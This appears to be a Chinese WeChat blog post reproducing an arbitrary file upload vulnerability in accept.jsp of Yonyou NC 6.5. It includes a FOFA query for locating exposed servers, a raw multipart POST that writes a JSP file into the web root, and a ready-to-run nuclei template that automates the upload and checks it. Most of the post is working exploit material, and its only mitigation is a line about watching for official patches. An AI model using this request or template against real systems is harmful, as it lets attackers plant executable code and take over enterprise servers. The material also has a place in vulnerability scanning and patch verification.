#  用友NC accept.jsp任意文件上传漏洞复现 nuclei poc

原创 fgz  [ AI与网安 ](javascript:void\(0\);)

**AI与网安** ![]()

微信号 gh_c57275954216

功能介绍 漏洞复现 0day/nday分享 poc/exp分享 渗透工具分享 AI算法在网络安全中的应用

____

___发表于_

收录于合集

  

免责申明： **本
文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

 **  
**

  

01

—

漏洞名称

  

  

用友NC accept.jsp任意文件上传漏洞

  

02

—  

漏洞影响

  

用友NC 6.5

![]()

  

  

03

—  

漏洞描述

  

用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC
accept.jsp处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。

  

04

—  

FOFA搜索语句

  * 

    
    
    icon_hash="1085941792"

![]()

  

05

—  

漏洞复现

  

POC如下

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /aim/equipmap/accept.jsp HTTP/1.1Host: x.x.x.xUser-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36Connection: closeContent-Length: 449Accept: */*Accept-Encoding: gzipContent-Type: multipart/form-data; boundary=---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc  
    -----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYcContent-Disposition: form-data; name="upload"; filename="2XpU7VbkFeTFZZLbSMlVZwJyOxz.txt"Content-Type: text/plain  
    <% out.println("2XpU7Y2Els1K9wZvOlSmrgolNci"); %>-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYcContent-Disposition: form-data; name="fname"  
    \webapps\nc_web\2XpU7WZCxP3YJqVaC0EjlHM5oAt.jsp-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc--

响应数据包如下

  *   *   *   *   * 

    
    
    HTTP/1.1 200 OKConnection: closeContent-Length: 242Content-Type: text/html;charset=gb2312Date: Tue, 07 Nov 2023 02:52:24 GMT

浏览器访问回显文件

![]()

证明存在漏洞

  

  

06

—  

nuclei poc

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    id: yonyou-nc-accept-fileupload  
    info:  name: 用友NC accept.jsp任意文件上传漏洞  author: fgz  severity: critical  description: |    用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC accept.jsp处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。  reference:    none  metadata:    verified: true    max-request: 2    fofa-query: icon_hash="1085941792"  tags: yonyou,nc,fileupload,2023  
    variables:  boundary: '{{rand_base(29)}}'  
    http:  - raw:      - |        POST /aim/equipmap/accept.jsp HTTP/1.1        Host: {{Hostname}}        Accept: */*        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}        Accept-Encoding: gzip  
            -----------------------------{{boundary}}        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"        Content-Type: text/plain  
            <% out.println("{{randstr_2}}"); %>        -----------------------------{{boundary}}        Content-Disposition: form-data; name="fname"  
            \webapps\nc_web\{{randstr_3}}.jsp        -----------------------------{{boundary}}--      - |        GET /{{randstr_3}}.jsp HTTP/1.1        Host: {{Hostname}}        Content-Type: application/x-www-form-urlencoded        Accept-Encoding: gzip  
        req-condition: true    matchers:      - type: dsl        dsl:          - "status_code_1 == 200"          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"        condition: and

![]()

  

  

07

—  

修复建议

  

关注官方补丁。

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

